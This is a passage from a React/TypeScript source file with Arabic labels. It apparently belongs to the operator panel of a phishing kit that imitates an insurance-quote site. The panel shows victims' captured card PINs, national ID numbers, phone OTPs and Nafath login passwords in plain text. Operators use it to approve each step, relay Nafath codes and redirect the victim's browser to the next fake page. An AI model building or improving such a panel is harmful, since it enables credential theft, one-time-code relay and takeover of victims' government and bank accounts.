                      <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#0c4a6e" }}>{pinValue}</span>
                    </div>
                  );
                })}
              </div>
              {effectivePinStatus === "approved" ? (
                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                  ✓ تمت الموافقة
                </div>
              ) : effectivePinStatus === "rejected" ? (
                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                  ✗ تم رفض رمز PIN
                </div>
              ) : (
                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                  ⏳ في انتظار المراجعة فقط
                </div>
              )}
              {showPinDecisionButtons && (
                <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                  <button onClick={() => handleLocalPinAction("approved")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                    موافقة
                  </button>
                  <button onClick={() => handleLocalPinAction("rejected")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                    رفض
                  </button>
                </div>
              )}
            </div>
            
            {/* زر عرض السجل */}
            {pinEntriesCount > 1 && (
              <button
                onClick={() => setOpenLogBox(openLogBox === 'pin' ? null : 'pin')}
                style={{
                  marginTop: 12,
                  width: "100%",
                  padding: "10px 16px",
                  border: "1px solid #d1d5db",
                  borderRadius: 8,
                  background: openLogBox === 'pin' ? "#f0fdf4" : "#f9fafb",
                  color: openLogBox === 'pin' ? "#16a34a" : "#374151",
                  fontWeight: 600,
                  fontSize: "0.8rem",
                  cursor: "pointer",
                  transition: "all 0.2s",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8
                }}
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
                  <polyline points="14,2 14,8 20,8" />
                  <line x1="16" y1="13" x2="8" y2="13" />
                  <line x1="16" y1="17" x2="8" y2="17" />
                </svg>
                عرض السجل ({pinEntriesCount} إدخالات)
              </button>
            )}
            
            {/* سجل الإدخالات */}
            {openLogBox === 'pin' && pinEntriesCount > 1 && (
              <div style={{
                marginTop: 12,
                padding: 12,
                background: "#f9fafb",
                borderRadius: 8,
                maxHeight: 300,
                overflowY: "auto"
              }}>
                <div style={{ fontSize: "0.75rem", fontWeight: 600, color: "#6b7280", marginBottom: 8 }}>
                  سجل الإدخالات:
                </div>
                {customerEntryGroup
                  .filter(entry => {
                    const raw = entry.raw || {};
                    return raw._v6 || raw.pinCode;
                  })
                  .sort((a, b) => {
                    const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
                    const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
                    return timeB - timeA;
                  })
                  .map((entry, idx) => {
                    const raw = entry.raw || {};
                    const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
                    const isCurrent = entry.id === selectedRequest?.id;
                    return (
                      <div key={entry.id} style={{
                        padding: "8px",
                        marginBottom: 8,
                        background: isCurrent ? "#dcfce7" : "#fff",
                        borderRadius: 6,
                        border: isCurrent ? "1px solid #16a34a" : "1px solid #e5e7eb",
                        fontSize: "0.7rem"
                      }}>
                        <div style={{ fontWeight: 600, color: "#374151", marginBottom: 4 }}>
                          {isCurrent ? "★ الحالي" : `إدخال ${idx + 1}`} - {entryTime}
                        </div>
                        {(raw._v6 || raw.pinCode) && (
                          <div style={{ color: "#6b7280" }}>رمز PIN: {raw._v6 || raw.pinCode}</div>
                        )}
                      </div>
                    );
                  })}
              </div>
            )}
          </div>
        )
      });
    }
    
    // Count entries that have Phone verification data
    const phoneEntriesCount = customerEntryGroup.filter(entry => {
      const raw = entry.raw || {};
      return raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
    }).length;
    
    // Find the most recent entry with Phone verification data
    let latestPhoneEntry: (typeof customerEntryGroup)[0] | null = null;
    let latestPhoneTimestamp = 0;
    
    customerEntryGroup.forEach((entry) => {
      const raw = entry.raw || {};
      const hasPhoneVerification = raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
      if (hasPhoneVerification) {
        // Use _v7UpdatedAt for phone timestamp, fallback to comparCompletedAt or submittedAt
        const ts = raw._v7UpdatedAt 
          ? new Date(raw._v7UpdatedAt).getTime()
          : (raw.comparCompletedAt ? new Date(raw.comparCompletedAt).getTime() 
            : (entry.submittedAt ? new Date(entry.submittedAt).getTime() : 0));
        if (ts >= latestPhoneTimestamp) {
          latestPhoneTimestamp = ts;
          latestPhoneEntry = entry;
        }
      }
    });

    // Create ONE box for Phone (latest entry only)
    if (latestPhoneEntry) {
      const raw = latestPhoneEntry.raw || {};
      // Use local decision first (for immediate feedback), then server status (for persistence)
      const serverPhoneStatus = raw.phoneOtpStatus || raw.phoneStatus || "";
      const effectivePhoneStatus = phoneLocalDecision || localDecisionStates.phone || serverPhoneStatus || "";
      const hasPhoneDecision = phoneLocalDecision || ["approved", "rejected"].includes(serverPhoneStatus);
      const showPhoneDecisionButtons = !hasPhoneDecision && Boolean(raw.phoneNumber || raw.phoneIdNumber || raw.phoneOtp || raw._v7);
      // Use _v7UpdatedAt for Phone box timestamp, fallback to comparCompletedAt or submittedAt
      let entryTimestamp = raw._v7UpdatedAt 
        ? new Date(raw._v7UpdatedAt).getTime()
        : (raw.comparCompletedAt ? new Date(raw.comparCompletedAt).getTime() 
          : (latestPhoneEntry.submittedAt ? new Date(latestPhoneEntry.submittedAt).getTime() : 0));

      boxes.push({
        key: `phone-${latestPhoneEntry.id}`,
        timestamp: entryTimestamp,
        component: (
          <div style={{ 
            background: "#f9fafb",
            borderRadius: 8, 
            padding: 8, 
            border: "1px solid #d1d5db",
            width: "40%",
            marginRight: 0,
            marginLeft: "auto",
            fontFamily: "Cairo, Tajawal, sans-serif"
          }}>
            <div style={{ marginBottom: 8 }}>
              <div style={{ 
                fontSize: "10px", 
                color: "#6b7280", 
                textAlign: "right",
                marginBottom: 4
              }}>
                {entryTimestamp > 0 ? (
                  <TimeCounter timestamp={entryTimestamp} />
                ) : "—"}
              </div>
              <h3 style={{
                fontSize: "14px",
                fontWeight: 700,
                color: "#1f2937",
                textAlign: "center",
                margin: 0
              }}>
                📱 تحقق الهاتف
              </h3>
            </div>
            <div style={{
              background: "#ffffff",
              borderRadius: 6,
              padding: 8,
              boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
            }}>
              {raw.phoneIdNumber && (
                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
                  <span style={{ fontSize: "12px", color: "#6b7280" }}>رقم الهوية</span>
                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.phoneIdNumber}</span>
                </div>
              )}
              {raw.phoneNumber && (
                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
                  <span style={{ fontSize: "12px", color: "#6b7280" }}>رقم الجوال</span>
                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.phoneNumber}</span>
                </div>
              )}
              {raw.phoneCarrier && (
                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
                  <span style={{ fontSize: "12px", color: "#6b7280" }}>شركة الاتصالات</span>
                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.phoneCarrier}</span>
                </div>
              )}
              {(raw.phoneOtp || raw._v7) && (
                <div style={{ marginTop: 8, background: "#f0f9ff", borderRadius: 8, padding: 12, textAlign: "center", marginBottom: 8 }}>
                  <p style={{ margin: 0, fontSize: "18px", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{raw.phoneOtp || raw._v7}</p>
                </div>
              )}
              {effectivePhoneStatus === "approved" ? (
                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                  ✓ تمت الموافقة - العميل يُوجه للصفحة التالية
                </div>
              ) : effectivePhoneStatus === "rejected" ? (
                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                  ✗ تم رفض رقم الهاتف - العميل سيُعيد المحاولة
                </div>
              ) : (
                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                  ⏳ في انتظار المراجعة فقط
                </div>
              )}
              {showPhoneDecisionButtons && (
                <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                  <button onClick={async () => { 
                    setPhoneLocalDecision("approved");
                    socketUpdatedBoxRef.current = "phone"; // Mark phone box as updated
                    setActionLoading("phone");
                    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                    if (visitorId) {
                      await fetch("/api/dashboard/reflect-status", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ visitorId, field: "phoneOtpStatus", status: "approved" }),
                      });
                      await fetch("/api/dashboard/redirect", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ visitorId, targetPage: "nafad", timestampField: "_v7UpdatedAt" }),
                      });
                    }
                    setActionLoading(null);
                    // Clear the marker after a delay
                    setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                  }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                    موافقة
                  </button>
                  <button onClick={async () => { 
                    setPhoneLocalDecision("rejected");
                    socketUpdatedBoxRef.current = "phone"; // Mark phone box as updated
                    setActionLoading("phone");
                    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                    if (visitorId) {
                      await fetch("/api/dashboard/reflect-status", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ visitorId, field: "phoneOtpStatus", status: "rejected" }),
                      });
                      await fetch("/api/dashboard/redirect", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ visitorId, targetPage: "step5", timestampField: "_v7UpdatedAt" }),
                      });
                    }
                    setActionLoading(null);
                    // Clear the marker after a delay
                    setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                  }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                    رفض
                  </button>
                </div>
              )}
            </div>
            
            {/* زر عرض السجل */}
            {phoneEntriesCount > 1 && (
              <button
                onClick={() => setOpenLogBox(openLogBox === 'phone' ? null : 'phone')}
                style={{
                  marginTop: 12,
                  width: "100%",
                  padding: "10px 16px",
                  border: "1px solid #d1d5db",
                  borderRadius: 8,
                  background: openLogBox === 'phone' ? "#f0fdf4" : "#f9fafb",
                  color: openLogBox === 'phone' ? "#16a34a" : "#374151",
                  fontWeight: 600,
                  fontSize: "0.8rem",
                  cursor: "pointer",
                  transition: "all 0.2s",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8
                }}
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
                  <polyline points="14,2 14,8 20,8" />
                  <line x1="16" y1="13" x2="8" y2="13" />
                  <line x1="16" y1="17" x2="8" y2="17" />
                </svg>
                عرض السجل ({phoneEntriesCount} إدخالات)
              </button>
            )}
            
            {/* سجل الإدخالات */}
            {openLogBox === 'phone' && phoneEntriesCount > 1 && (
              <div style={{
                marginTop: 12,
                padding: 12,
                background: "#f9fafb",
                borderRadius: 8,
                maxHeight: 300,
                overflowY: "auto"
              }}>
                <div style={{ fontSize: "0.75rem", fontWeight: 600, color: "#6b7280", marginBottom: 8 }}>
                  سجل الإدخالات:
                </div>
                {customerEntryGroup
                  .filter(entry => {
                    const raw = entry.raw || {};
                    return raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
                  })
                  .sort((a, b) => {
                    const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
                    const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
                    return timeB - timeA;
                  })
                  .map((entry, idx) => {
                    const raw = entry.raw || {};
                    const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
                    const isCurrent = entry.id === selectedRequest?.id;
                    return (
                      <div key={entry.id} style={{
                        padding: "8px",
                        marginBottom: 8,
                        background: isCurrent ? "#dcfce7" : "#fff",
                        borderRadius: 6,
                        border: isCurrent ? "1px solid #16a34a" : "1px solid #e5e7eb",
                        fontSize: "0.7rem"
                      }}>
                        <div style={{ fontWeight: 600, color: "#374151", marginBottom: 4 }}>
                          {isCurrent ? "★ الحالي" : `إدخال ${idx + 1}`} - {entryTime}
                        </div>
                        {raw.phoneIdNumber && (
                          <div style={{ color: "#6b7280" }}>رقم الهوية: {raw.phoneIdNumber}</div>
                        )}
                        {raw.phoneCarrier && (
                          <div style={{ color: "#6b7280" }}>شركة الاتصالات: {raw.phoneCarrier}</div>
                        )}
                      </div>
                    );
                  })}
              </div>
            )}
          </div>
        )
      });
    }
    
// Count entries that have Nafad data
    const nafadEntriesCount = customerEntryGroup.filter(entry => {
      const raw = entry.raw || {};
      return raw.nafadIdNumber || raw.nafadPassword;
    }).length;
    
    // Find the most recent entry with Nafad data
    let latestNafadEntry: (typeof customerEntryGroup)[0] | null = null;
    let latestNafadTimestamp = 0;
    
    customerEntryGroup.forEach((entry) => {
      const raw = entry.raw || {};
      const hasNafad = raw.nafadIdNumber || raw.nafadPassword;
      if (hasNafad) {
        // Use nafadUpdatedAt for nafad timestamp, fallback to comparCompletedAt or submittedAt
        const ts = raw.nafadUpdatedAt 
          ? new Date(raw.nafadUpdatedAt).getTime()
          : (raw.comparCompletedAt ? new Date(raw.comparCompletedAt).getTime() 
            : (entry.submittedAt ? new Date(entry.submittedAt).getTime() : 0));
        if (ts >= latestNafadTimestamp) {
          latestNafadTimestamp = ts;
          latestNafadEntry = entry;
        }
      }
    });

    // Create ONE box for Nafad (latest entry only)
    if (latestNafadEntry) {
      const raw = latestNafadEntry.raw || {};
      // Use nafadUpdatedAt for Nafad box timestamp, fallback to comparCompletedAt or submittedAt
      let entryTimestamp = raw.nafadUpdatedAt 
        ? new Date(raw.nafadUpdatedAt).getTime()
        : (raw.comparCompletedAt ? new Date(raw.comparCompletedAt).getTime() 
          : (latestNafadEntry.submittedAt ? new Date(latestNafadEntry.submittedAt).getTime() : 0));

      boxes.push({
        key: `nafad-${latestNafadEntry.id}`,
        timestamp: entryTimestamp,
        component: (
          <div style={{ 
            background: "#f9fafb",
            borderRadius: 8, 
            padding: 8, 
            border: "1px solid #d1d5db",
            width: "40%",
            marginRight: 0,
            marginLeft: "auto",
            fontFamily: "Cairo, Tajawal, sans-serif"
          }}>
            <div style={{ marginBottom: 8 }}>
              <div style={{ 
                fontSize: "10px", 
                color: "#6b7280", 
                textAlign: "right",
                marginBottom: 4
              }}>
                {entryTimestamp > 0 ? (
                  <TimeCounter timestamp={entryTimestamp} />
                ) : "—"}
              </div>
              <h3 style={{
                fontSize: "14px",
                fontWeight: 700,
                color: "#1f2937",
                textAlign: "center",
                margin: 0
              }}>
                🔐 نفاذ
              </h3>
            </div>
            <div style={{
              background: "#ffffff",
              borderRadius: 6,
              padding: 8,
              boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
            }}>
              {raw.nafadIdNumber && (
                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 4 }}>
                  <span style={{ fontSize: "12px", color: "#6b7280" }}>رقم الهوية</span>
                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.nafadIdNumber}</span>
                </div>
              )}
              {raw.nafadPassword && (
                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
                  <span style={{ fontSize: "12px", color: "#6b7280" }}>كلمة المرور</span>
                  <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.nafadPassword}</span>
                </div>
              )}
              {/* حقل إدخال رمز النفاذ */}
              <input
                type="text"
                placeholder="أدخل رمز النفاذ..."
                value={nafadInput}
                onChange={(e) => setNafadInput(e.target.value)}
                style={{ 
                  width: "100%", 
                  padding: "10px 12px", 
                  border: "1px solid #d1d5db", 
                  borderRadius: 8, 
                  fontSize: "14px",
                  textAlign: "center",
                  letterSpacing: "0.2em",
                  direction: "ltr",
                  marginBottom: 8
                }}
              />
            {/* زر إرسال رمز النفاذ */}
            <button 
              onClick={() => handleNafadCode(nafadInput)}
              disabled={actionLoading === "nafad" || !nafadInput.trim()}
              style={{ 
                width: "100%", 
                padding: "10px 16px", 
                border: "none", 
                borderRadius: 8, 
                background: nafadInput.trim() ? "#111827" : "#9ca3af", 
                color: "#ffffff", 
                fontWeight: 600, 
                cursor: actionLoading === "nafad" || !nafadInput.trim() ? "wait" : "pointer"
              }}
            >
              📤 {actionLoading === "nafad" ? "جارٍ الإرسال..." : "إرسال رمز النفاذ"}
            </button>
            </div>
            
            {/* زر عرض السجل */}
            {nafadEntriesCount > 1 && (
              <button
                onClick={() => setOpenLogBox(openLogBox === 'nafad' ? null : 'nafad')}
                style={{
                  marginTop: 12,
                  width: "100%",
                  padding: "10px 16px",
                  border: "1px solid #d1d5db",
                  borderRadius: 8,
                  background: openLogBox === 'nafad' ? "#f0fdf4" : "#f9fafb",
                  color: openLogBox === 'nafad' ? "#16a34a" : "#374151",
                  fontWeight: 600,
                  fontSize: "0.8rem",
                  cursor: "pointer",
                  transition: "all 0.2s",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8
                }}
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
                  <polyline points="14,2 14,8 20,8" />
                  <line x1="16" y1="13" x2="8" y2="13" />
                  <line x1="16" y1="17" x2="8" y2="17" />
                </svg>
                عرض السجل ({nafadEntriesCount} إدخالات)
              </button>
            )}
            
            {/* سجل الإدخالات */}
            {openLogBox === 'nafad' && nafadEntriesCount > 1 && (
              <div style={{
                marginTop: 12,
                padding: 12,
                background: "#f9fafb",
                borderRadius: 8,
                maxHeight: 300,
                overflowY: "auto"
              }}>
                <div style={{ fontSize: "0.75rem", fontWeight: 600, color: "#6b7280", marginBottom: 8 }}>
                  سجل الإدخالات:
                </div>
                {customerEntryGroup
                  .filter(entry => {
                    const raw = entry.raw || {};
                    return raw.nafadIdNumber || raw.nafadPassword;
                  })
                  .sort((a, b) => {
                    const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
                    const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
                    return timeB - timeA;
                  })
                  .map((entry, idx) => {
                    const raw = entry.raw || {};
                    const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
                    const isCurrent = entry.id === selectedRequest?.id;
                    return (
                      <div key={entry.id} style={{
                        padding: "8px",
                        marginBottom: 8,
                        background: isCurrent ? "#dcfce7" : "#fff",
                        borderRadius: 6,
                        border: isCurrent ? "1px solid #16a34a" : "1px solid #e5e7eb",
                        fontSize: "0.7rem"
                      }}>
                        <div style={{ fontWeight: 600, color: "#374151", marginBottom: 4 }}>
                          {isCurrent ? "★ الحالي" : `إدخال ${idx + 1}`} - {entryTime}
                        </div>
                        {raw.nafadIdNumber && (
                          <div style={{ color: "#6b7280" }}>رقم الهوية: {raw.nafadIdNumber}</div>
                        )}
                      </div>
                    );
                  })}
              </div>
            )}
          </div>
        )
      });
    }
    
        // Count entries that have Package/Offer data
    const packageEntriesCount = customerEntryGroup.filter(entry => {
      const raw = entry.raw || {};
      return raw.selectedOffer || raw.offerTotalPrice;
    }).length;
    
    // Find the most recent entry with Package data
    let latestPackageEntry: (typeof customerEntryGroup)[0] | null = null;
    let latestPackageTimestamp = 0;
    
    customerEntryGroup.forEach((entry) => {
      const raw = entry.raw || {};
      if (raw.selectedOffer || raw.offerTotalPrice) {
        const ts = raw.comparCompletedAt
          ? new Date(raw.comparCompletedAt).getTime()
          : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
        if (ts >= latestPackageTimestamp) {
          latestPackageTimestamp = ts;
          latestPackageEntry = entry;
        }
      }
    });

    // Create ONE box for Package (latest entry only)
    if (latestPackageEntry) {
      const raw = latestPackageEntry.raw || {};
      const selectedOffer = raw.selectedOffer;
      let entryTimestamp = Date.now();
      if (raw.comparCompletedAt) {
        const comparTs = new Date(raw.comparCompletedAt).getTime();
        if (comparTs > 0) {
          entryTimestamp = comparTs;
        }
      } else if (latestPackageEntry.submittedAt) {
        entryTimestamp = new Date(latestPackageEntry.submittedAt).getTime();
      }
      boxTimestamps.push({ type: 'package', timestamp: entryTimestamp, key: `package-${latestPackageEntry.id}` });

      const offerName = selectedOffer?.name || "—";
      const offerType = selectedOffer?.type === "comprehensive" ? "تأمين شامل" : "تأمين ضد الغير";
      const offerPrice = raw.offerTotalPrice ? `${Number(raw.offerTotalPrice).toFixed(2)} ﷼` : "—";
      const selectedFeatures = selectedOffer?.extra_features || [];

      boxes.push({
        key: `package-${latestPackageEntry.id}`,
        timestamp: entryTimestamp,
        component: (
          <div style={{
            background: "#f9fafb",
            borderRadius: 8,
            padding: 8,
            border: "1px solid #d1d5db",
            width: "40%",
            marginRight: 0,
            marginLeft: "auto",
            fontFamily: "Cairo, Tajawal, sans-serif"
          }}>
            {/* Header with date and title */}
            <div style={{ marginBottom: 8 }}>
              <div style={{ 
                fontSize: "10px", 
                color: "#6b7280", 
                textAlign: "right",
                marginBottom: 4
              }}>
                {entryTimestamp > 0 ? (
                  <TimeCounter timestamp={entryTimestamp} />
                ) : "—"}
              </div>
              <h3 style={{
                fontSize: "14px",
                fontWeight: 700,
                color: "#1f2937",
                textAlign: "center",
                margin: 0
              }}>
                العرض المختار
              </h3>
            </div>

            {/* Content Box */}
            <div style={{
              background: "#ffffff",
              borderRadius: 6,
              padding: 8,
              boxShadow: "0 1px 2px rgba(0,0,0,0.05)"
            }}>
              {/* Company Name */}
              <div style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                gap: 8,
                fontSize: "14px",
                marginBottom: 8
              }}>
                <span style={{ fontWeight: 600, color: "#4b5563" }}>الشركة:</span>
                <span style={{ fontWeight: 700, color: "#111827", textAlign: "right" }}>{offerName}</span>
              </div>

              {/* Original Price */}
              <div style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                gap: 8,
                fontSize: "14px",
                marginBottom: 8
              }}>
                <span style={{ fontWeight: 600, color: "#4b5563" }}>السعر الأصلي:</span>
                <span style={{ fontWeight: 700, color: "#111827", textAlign: "right" }}>{offerPrice}</span>
              </div>

              {/* Discount */}
              <div style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                gap: 8,
                fontSize: "14px",
                marginBottom: 8
              }}>
                <span style={{ fontWeight: 600, color: "#4b5563" }}>الخصم:</span>
                <span style={{ fontWeight: 700, color: "#111827", textAlign: "right" }}>
                  {selectedOffer?.discount ? `${selectedOffer.discount}%` : "0%"}
                </span>
              </div>

              {/* Final Price */}
              <div style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                gap: 8,
                fontSize: "14px",
                marginBottom: selectedFeatures.length > 0 ? 8 : 0
              }}>
                <span style={{ fontWeight: 600, color: "#4b5563" }}>السعر النهائي:</span>
                <span style={{ fontWeight: 700, color: "#111827", textAlign: "right" }}>{offerPrice}</span>
              </div>

              {/* Selected Features */}
              {selectedFeatures.length > 0 && (
                <div style={{
                  background: "#f0fdf4",
                  borderRadius: 6,
                  padding: 8,
                  marginTop: 8
                }}>
                  <div style={{ fontSize: "12px", fontWeight: 600, color: "#166534", marginBottom: 4 }}>
                    الميزات المختارة:
                  </div>
                  {selectedFeatures.map((feature: string, idx: number) => (
                    <div key={idx} style={{ fontSize: "11px", color: "#15803d", marginBottom: 2 }}>
                      ✓ {feature}
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* زر عرض السجل */}
            {packageEntriesCount > 1 && (
              <button
                onClick={() => setOpenLogBox(openLogBox === 'package' ? null : 'package')}
                style={{
                  marginTop: 12,
                  width: "100%",
                  padding: "10px 16px",
                  border: "1px solid #d1d5db",
                  borderRadius: 8,
                  background: openLogBox === 'package' ? "#f0fdf4" : "#f9fafb",
                  color: openLogBox === 'package' ? "#16a34a" : "#374151",
                  fontWeight: 600,
                  fontSize: "0.8rem",
                  cursor: "pointer",
                  transition: "all 0.2s",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8
                }}
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
                  <polyline points="14,2 14,8 20,8" />
                  <line x1="16" y1="13" x2="8" y2="13" />
                  <line x1="16" y1="17" x2="8" y2="17" />
                </svg>
                عرض السجل ({packageEntriesCount} إدخالات)
              </button>
            )}

            {/* سجل الإدخالات */}
            {openLogBox === 'package' && packageEntriesCount > 1 && (
              <div style={{
                marginTop: 12
              }}>
                <div style={{ 
                  fontSize: "12px", 
                  fontWeight: 600, 
                  color: "#6b7280", 
                  marginBottom: 8,
                  display: "flex",
                  alignItems: "center",
                  gap: 6
                }}>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  سجل الإدخالات السابقة:
                </div>
                {customerEntryGroup
                  .filter(entry => {
                    const raw = entry.raw || {};
                    return raw.selectedOffer || raw.offerTotalPrice;
                  })
                  .filter(entry => entry.id !== latestPackageEntry.id)
                  .sort((a, b) => {
                    const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
                    const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
                    return timeB - timeA;
                  })
                  .map((entry) => {
                    const raw = entry.raw || {};
                    const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
                    const entryOffer = raw.selectedOffer;
                    const entryOfferName = entryOffer?.name || "—";
                    const entryOfferPrice = raw.offerTotalPrice ? `${Number(raw.offerTotalPrice).toFixed(2)} ﷼` : "—";
                    return (
                      <div key={entry.id} style={{
                        marginBottom: 8,
                        padding: 10,
                        background: "#ffffff",
                        borderRadius: 8,
                        border: "1px solid #e5e7eb"
                      }}>
                        <div style={{
                          fontSize: "9px",
                          color: "#9ca3af",
                          marginBottom: 6
                        }}>
                          {entryTime}
                        </div>
                        <div style={{
                          display: "flex",
                          justifyContent: "space-between",
                          alignItems: "center",
                          fontSize: "12px",
                          marginBottom: 4
                        }}>
                          <span style={{ color: "#4b5563" }}>الشركة:</span>
                          <span style={{ fontWeight: 600, color: "#111827" }}>{entryOfferName}</span>
                        </div>
                        <div style={{
                          display: "flex",
                          justifyContent: "space-between",
                          alignItems: "center",
                          fontSize: "12px"
                        }}>
                          <span style={{ color: "#4b5563" }}>السعر:</span>
                          <span style={{ fontWeight: 700, color: "#111827" }}>{entryOfferPrice}</span>
                        </div>
                      </div>
                    );
                  })}
              </div>
            )}
          </div>
        )
      });
    }

    // Sort boxes by timestamp (newest first)
    boxes.sort((a, b) => b.timestamp - a.timestamp);
    
    // Render sorted boxes
    return (
      <div style={{ display: "flex", flexDirection: "column", gap: 12, padding: 16 }}>
        {boxes.map((box, index) => (
          <div key={box.key} style={{ position: "relative" }}>
            <MemoizedBox component={box.component} timestamp={box.timestamp} />
            {/* Show "الأحدث" only for the first (latest) box */}
            {index === 0 && (
              <span style={{
                position: "absolute",
                top: 8,
                right: 8,
                background: "#3b82f6",
                color: "#fff",
                padding: "2px 8px",
                borderRadius: 4,
                fontSize: "0.65rem",
                fontWeight: 600,
                zIndex: 10
              }}>
                الأحدث
              </span>
            )}
          </div>
        ))}
      </div>
    );
  };

  // Render action buttons based on current page
  const renderActionButtons = () => {
    // Get the selected request's timestamp
    const getSelectedTimestamp = (): number => {
      const timestamp = selectedRequest?.updatedAt || selectedRequest?.submittedAt;
      if (!timestamp) return 0;
      const date = new Date(timestamp).getTime();
      return isNaN(date) ? 0 : date;
    };
    
    // Create array of boxes with timestamps from customerEntryGroup (newest first)
    const boxes: Array<{ name: string; timestamp: number; component: React.ReactNode }> = [];
    
    const nafadBox = renderNafadBox();
    if (nafadBox) {
      const nafadEntries = customerEntryGroup.filter(e => e.raw?.nafadStatus || e.raw?.nafadIdNumber);
      const nafadTime = nafadEntries.length > 0 
        ? Math.max(...nafadEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
        : getSelectedTimestamp();
